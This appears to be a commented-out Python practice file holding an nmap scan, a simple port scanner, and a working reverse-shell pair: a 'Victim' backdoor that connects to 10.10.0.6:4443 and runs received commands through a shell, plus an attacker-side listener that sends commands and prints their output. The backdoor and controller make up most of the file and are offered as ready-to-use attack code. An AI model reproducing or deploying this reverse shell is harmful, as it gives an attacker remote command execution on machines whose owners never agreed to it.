
# nmap scanner
# import nmap
# import json
#
# scannerObject = nmap.PortScanner
# results = scannerObject.scan_top_ports("localhost")
# results = json.dumps(result, indent=1, sort_keys=True)
# print(results)

# Victim
# import socket
# import subprocess
#
# connectbackip = '10.10.0.6'
# connectbackport = 4443
#
# backdoor = socket.socket()
# backdoor.connect((connectbackip, connectbackport))
#
# while True:
#     cmd = backdoor.recv(1024)
#     cmd = cmd.decode()
#     ops = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
#
#     output = ops.stdout.read()
#     output_errors = ops.stderr.read()
#     backdoor.send(output + output_errors)


# Malware
# import socket
#
# attackerip = '10.10.0.6'
# attackerport = 4443
#
# server = socket.socket()
# server.bind((attackerip, attackerport))
# print("[+]Server started!")
# print("[+]Listening for victims connections!")
# server.listen(1)
#
# victim, victimaddress = server.accept()
# print(f"[+]{victimaddress} opened the backdoor! or malware!")
#
# while True:
#     cmd = input("Enter command: ")
#     cmd = cmd.encode()
#     victim.send(cmd)
#     print("[+] command sent to target!")
#     output = victim.recv(1024)
#     output = output.decode()
#     print(f"[+]Command output:\n{output}")


# Port Scanner
# import socket
# from colorama import Fore
#
# GREEN =Fore.GREEN
# GRAY = Fore.LIGHTBLACK_EX
# RESET = Fore.RESET
#
# def portscanner(host, port):
#     sock = socket.socket()
#     try:
#         sock.connect((host, port))
#         sock.settimeout(0.2)
#     except:
#         return False
#     else:
#         return True
#
# def runner():
#     host = input("Please enter host to scan: ")
#
#     for port in range(1, 1000):
#         if(portscanner(host, port)):
#             print(f"{GREEN}[+]The port {port} was open on {host}! {RESET}")
#         else:
#             print(f"{GRAY}[-]Port is closed!{RESET}", end="\r")
#
#
# if __name__ == "__main__":
#     runner()
